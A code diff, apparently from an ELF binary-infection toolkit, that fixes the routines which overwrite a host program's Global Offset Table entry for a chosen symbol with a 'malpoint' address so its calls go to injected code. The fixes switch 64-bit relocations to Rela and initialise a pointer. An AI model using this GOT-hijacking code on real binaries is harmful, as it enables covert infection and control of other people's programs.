@@ -121,7 +121,7 @@ Elf32_Addr got_redirect_32(Elfit_t *host, char *target, uint32_t malpoint)
 
     relocptr = data_offset + ((Elf32_Off) (gotptr - data_vaddr));
 
-    printf("[+ .GOT REDIR]Patching 0x%x (offset 0x%x) with 0x%x\n",
+    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
         gotptr, relocptr,  malpoint);
     *(unsigned long*)&host->mem[relocptr] = malpoint;
 
@@ -149,7 +149,7 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
     Elf64_Ehdr *ehdr;
     Elf64_Shdr *shdr;
     Elf64_Phdr *phdr;
-    Elf64_Rel *rel;
+    Elf64_Rela *rel;
     Elf64_Sym *dynsym;
     char *dynstr;
     int i, c, ofd; 
@@ -166,7 +166,7 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
         printf("could not find relocation table\n");
         return -1;
     }
-    rel = (Elf64_Rel *) (host->mem + shdr[relindex].sh_offset);
+    rel = (Elf64_Rela *) (host->mem + shdr[relindex].sh_offset);
 
     if ((dynsymindex = get_section_by_name_64(".dynsym", host)) == -1)
     {
@@ -182,7 +182,8 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
     }
     dynstr = (char *) (host->mem + shdr[dynstrindex].sh_offset);
 
-    for(i = 0; i < (shdr[relindex].sh_size / sizeof(Elf64_Rel)); i++)
+    gotptr = 0x0;
+    for(i = 0; i < (shdr[relindex].sh_size / sizeof(Elf64_Rela)); i++)
     {
         if (strcmp(&dynstr[dynsym[ELF64_R_SYM(rel[i].r_info)].st_name], target) == 0)
         {
@@ -209,7 +210,7 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
 
     relocptr = data_offset + ((Elf64_Off) (gotptr - data_vaddr));
 
-    printf("[+ .GOT REDIR]Patching 0x%x (offset 0x%x) with 0x%x\n",
+    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
         gotptr, relocptr,  malpoint);
     *(unsigned long*)&host->mem[relocptr] = malpoint;
 
